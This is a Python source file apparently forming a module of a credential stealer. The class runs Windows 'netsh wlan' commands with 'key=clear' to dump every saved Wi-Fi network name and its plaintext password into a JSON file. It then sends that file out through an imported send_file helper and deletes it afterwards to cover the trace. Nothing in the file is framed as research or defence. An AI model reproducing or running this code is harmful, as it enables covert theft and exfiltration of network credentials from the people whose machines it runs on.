import subprocess
import json
from send_file import send_file
from removefile import removefile

class wifipasswordextractor:
    def __init__(self):
        self.wifi_networks = []

    def extract_passwords(self):
        try:
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in output if "All User Profile" in i]
            for profile in profiles:
                try:
                    wifi_details = {}
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        wifi_details["ssid"] = profile
                        wifi_details["password"] = results[0]
                    except IndexError:
                        wifi_details["ssid"] = profile
                        wifi_details["password"] = None
                    self.wifi_networks.append(wifi_details)
                except subprocess.CalledProcessError:
                    print("Failed to extract password for: {}".format(profile))
            return self.wifi_networks
        except subprocess.CalledProcessError:
            print("Error executing command")

    def write(self):
        #Create file and write system info to this file
        with open("wifipasswords.json", 'w') as f:
            json.dump(self.wifi_networks, f)

    def send(self):
        send_file("wifipasswords.json")

    def remove(self):
        removefile("wifipasswords.json")